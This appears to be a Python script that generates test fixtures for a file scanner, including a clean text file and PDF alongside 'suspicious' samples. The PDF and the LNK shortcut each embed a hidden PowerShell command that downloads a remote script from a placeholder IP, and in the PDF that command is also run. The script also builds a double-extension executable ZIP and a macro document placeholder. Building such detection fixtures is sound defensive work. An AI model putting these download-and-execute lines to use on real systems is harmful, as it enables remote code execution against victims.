import zipfile
import io
from pathlib import Path

samples_dir = Path(__file__).parent / "samples"
samples_dir.mkdir(parents=True, exist_ok=True)

# 1. Clean Text file
(samples_dir / "clean_notes.txt").write_text(
    "Meeting notes: Reviewed Q3 product roadmap and server infrastructure budget.",
    encoding="utf-8"
)

# 2. Clean PDF
clean_pdf = (
    b"%PDF-1.4\n"
    b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\nendobj\n"
    b"4 0 obj\n<< /Length 30 >>\nstream\nBT /F1 12 Tf (Clean Invoice) Tj ET\nendstream\nendobj\n"
    b"xref\n0 5\n0000000000 65535 f\ntrailer\n<< /Size 5 /Root 1 0 R >>\n%%EOF\n"
)
(samples_dir / "clean_report.pdf").write_bytes(clean_pdf)

# 3. Suspicious PDF with /Launch and /JavaScript
susp_pdf = (
    b"%PDF-1.4\n"
    b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /Launch /F (powershell.exe -ExecutionPolicy Bypass -NoProfile -w hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.22/stg.ps1')) >> >>\nendobj\n"
    b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    b"3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n"
    b"4 0 obj\n<< /S /JavaScript /JS (app.alert('Exploit trigger');) >>\nendobj\n"
    b"trailer\n<< /Size 5 /Root 1 0 R >>\n%%EOF\n"
)
(samples_dir / "test_launch_exploit.pdf").write_bytes(susp_pdf)

# 4. Suspicious ZIP with disguised double extension
zip_buf = io.BytesIO()
with zipfile.ZipFile(zip_buf, "w") as z:
    z.writestr("important_receipt.pdf.exe", b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00FakePEPayload")
    z.writestr("read_me.txt", "Please open the receipt above.")
(samples_dir / "test_smuggled_archive.zip").write_bytes(zip_buf.getvalue())

# 5. Suspicious Office doc with VBA Macro
docm_buf = io.BytesIO()
with zipfile.ZipFile(docm_buf, "w") as z:
    z.writestr("[Content_Types].xml", '<?xml version="1.0" encoding="UTF-8"?><Types></Types>')
    z.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Confidential Invoice</w:t></w:r></w:p></w:body></w:document>")
    z.writestr("word/vbaProject.bin", b"VBA_MACRO_BINARY_DATA_WITH_AUTORUN_HOOK_AND_POWERSHELL_DOWNLOADER")
(samples_dir / "test_macro_document.docm").write_bytes(docm_buf.getvalue())

# 6. Suspicious Windows Shortcut LNK
lnk_data = (
    b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F"
    b"\x00\x00\x00\x00powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command (New-Object Net.WebClient).DownloadString('http://198.51.100.99/payload.ps1')\x00"
)
(samples_dir / "test_malicious_shortcut.lnk").write_bytes(lnk_data)

print("Sample test files generated successfully!")
